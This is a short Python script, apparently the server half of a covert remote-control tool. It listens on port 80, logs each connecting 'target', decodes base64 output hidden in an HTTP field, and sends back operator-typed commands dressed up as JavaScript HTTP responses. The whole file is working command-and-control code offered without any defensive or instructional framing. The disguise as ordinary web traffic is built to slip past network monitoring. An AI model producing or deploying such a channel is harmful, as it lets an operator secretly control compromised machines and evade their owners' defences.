import socket
import time
import base64

#接收数据
def recv_data(ss, only_read=False):
    # 接收数据
    read_bytes = bytes()
    while True:
        getData = ss.recv(512)
        if not getData:
            break
        else:
            read_bytes += getData
            if read_bytes.count(b"\r\n\r\n") == 2:
                break

    # 处理数据
    result = read_bytes.decode()

    result = result[result.find("\r\n\r\nstri0date=") + 14:]
    result = result[:result.find("\r\n\r\n")]

    # 解码/解密
    result = str(base64.b64decode(result), "utf-8")

    if only_read:
        ss.close()

    return result

#响应数据
def response(ss, data):
    # 编码/加密
    data = base64.b64encode(data.encode("utf-8")).decode()

    # 发送数据
    date = time.strftime('%a, %d %b %Y %X GMT',time.localtime(time.time()))
    body = data

    sendData = "HTTP/1.1 200 OK"
    sendData += "\r\n"
    sendData += "Date: %s" % date
    sendData += "\r\n"
    sendData += "Content-Type: application/x-javascript"
    sendData += "\r\n"
    sendData += "Content-Length: %d" % len(body)
    sendData += "\r\n"
    sendData += "Connection: keep-alive"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "%s%s" % (body, "_kHbBf7oL")


    ss.send(sendData.encode())
    ss.close()

def server():
    address = ('0.0.0.0', 80)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(address)
    s.listen(5)

    # 获取连接信息
    ss, addr = s.accept()
    print("目标:", addr)

    result = recv_data(ss, only_read=True)
    print(result)

    while True:
        ss, addr = s.accept()
        result = recv_data(ss)
        if result != '':
            print(result)

        data = input(">")

        response(ss, data)

    s.close()

if __name__ == '__main__':
    server()